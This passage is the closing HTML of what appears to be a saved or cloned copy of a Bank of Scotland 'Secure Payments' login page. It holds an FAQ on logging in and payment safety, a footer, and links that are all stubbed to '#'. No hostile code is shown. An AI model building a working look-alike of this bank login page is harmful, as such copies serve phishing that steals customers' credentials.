                                                                            <g id="chevron-right">
                                                                                <polygon id="Fill-1" transform="translate(12.000000, 12.000000) rotate(-360.000000) translate(-12.000000, -12.000000) " points="4 0 4 4.83365323 13.2961421 12 4 19.1663468 4 24 20 12.0460653"></polygon>
                                                                            </g>
                                                                        </g>
                                                                    </svg>
                                                                </div>
                                                            </button>
                                                        </div>
                                                    </div>
                                                </form>
                                            </div>
                                            <div class="sc-fjdhpX pAihb">
                                                <article class="auth-accordion">
                                                    <div class="content-wrapper ">
                                                        <div class="accordion full-break">
                                                            <h2 class="accordion-header" data-selector="accordion-header-title">Need help?</h2>
                                                            <ul class="accordion-items" role="menu">
                                                                <li class="accordion-item " role="menuitem">
                                                                    <hr>
                                                                    <h3><a href="#" data-selector="accordion-item-header-0"><span>What is Bank of Scotland Secure Payments?</span></a></h3>
                                                                    <div class="accordion-item-content" style="display: none;" data-selector="accordion-item-content-0">
                                                                        <p>Bank of Scotland Secure Payments lets you set up a payment direct from your Bank of Scotland account through another website or app. The payment process is the same as through Internet Banking, but the payee details and payment amount will be provided by the website or app you make the payment through.</p>
                                                                        <p> When you make a payment through another website or app, none of your login details are shared.</p>
                                                                    </div>
                                                                </li>
                                                                <li class="accordion-item " role="menuitem">
                                                                    <hr>
                                                                    <h3><a href="#" data-selector="accordion-item-header-1"><span>How do I log in?</span></a></h3>
                                                                    <div class="accordion-item-content" style="display: none;" data-selector="accordion-item-content-1">
                                                                        <p>Use the same login details as you do for Internet Banking. We'll ask for these on three separate screens. We might also ask you to complete an additional security check.</p>
                                                                        <p>When you make a payment through another website or app, none of your login details are shared.</p>
                                                                        <p>To use this service you must be registered for Internet Banking. If you don't already use Internet Banking, it's simple to register as a <a href="#">personal</a> or <a href="#">business</a> customer.</p>
                                                                    </div>
                                                                </li>
                                                                <li class="accordion-item " role="menuitem">
                                                                    <hr>
                                                                    <h3><a href="#" data-selector="accordion-item-header-2"><span>How does this payment work?</span></a></h3>
                                                                    <div class="accordion-item-content" style="display: none;" data-selector="accordion-item-content-2">
                                                                        <p>When you've set up the payment with us, the other website or app will process your payment. This might take up to 24 hours, and you'll be able to see it on your statement in Internet Banking afterwards.</p>
                                                                        <p>Your payment's protected the same way as in Internet Banking. If there's a problem with a purchase you've made, you'll need to contact the retailer.
                                                                        </p>
                                                                    </div>
                                                                </li>
                                                                <li class="accordion-item " role="menuitem">
                                                                    <hr>
                                                                    <h3><a href="#" data-selector="accordion-item-header-3"><span>How safe is it?</span></a></h3>
                                                                    <div class="accordion-item-content" style="display: none;" data-selector="accordion-item-content-3">
                                                                        <p>Bank of Scotland Secure Payments has the same level of security as Internet Banking. You'll need all the same details to log in. We might also ask you to complete a security check when you pay a new payee for the first time.
                                                                        </p>
                                                                        <p>Remember to check that the payee's account details are genuine.</p>
                                                                        <p>We'll never call and ask you to transfer your money to another account that you don't have control over.</p>
                                                                    </div>
                                                                </li>
                                                            </ul>
                                                        </div>
                                                    </div>
                                                </article>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <section id="consent-controller">
                                    <div> </div>
                                </section>
                                <section id="commercial-consent-controller">
                                    <div> </div>
                                </section>
                            </div>
                        </div>
                    </article>
                    <noscript></noscript>
                </main>
            </div>
            <footer class="page-footer container-fluid" role="contentinfo" aria-hidden="false">
                <div class="container">
                    <ul>
                        <li>
                            <h3 class="link-heading">Legal - </h3><span><a href="#"  rel="noopener noreferrer" title="Legal - personal customers (opens in a new tab or window)">Personal</a><span class="link-separator"> | </span></span><a href="#"  rel="noopener noreferrer" title="Legal - business customers (opens in a new tab or window)">Business</a></li>
                        <li>
                            <h3 class="link-heading">Privacy - </h3><span><a href="#"  rel="noopener noreferrer" title="Privacy - personal customers (opens in a new tab or window)">Personal</a><span class="link-separator"> | </span></span><a href="#"  rel="noopener noreferrer" title="Privacy - business customers (opens in a new tab or window)">Business</a></li>
                        <li><a href="#"  rel="noopener noreferrer" title="Security (opens in a new tab or window)">Security</a></li>
                        <li><a href="#"  rel="noopener noreferrer" title="Cookies (opens in a new tab or window)">Cookies</a></li>
                        <li><a href="#"  rel="noopener noreferrer" title="Lloyds Banking Group (opens in a new tab or window)">Lloyds Banking Group</a></li>
                    </ul>
                </div>
            </footer>
            <style>
                @media (max-width: 480px) {
                    .rmq-66973723 {
                        width: 100% !important;
                    }
                }
            </style>
        </div>
    </div>
    <!--[if IE 8]>
      <script src="content/42-4a5506d0c661e582096f58fbf4092b7db2e9cedf/scripts/vendor/ie8-combined.js"></script>
    <![endif]-->

    <noscript>
        <iframe style="display: none;" src="assets/files/tags_002.js"></iframe>
    </noscript>
    <iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" style="width: 100px; height: 100px; border: 0px none; position: absolute; top: -5000px;"></iframe>
</body>

</html>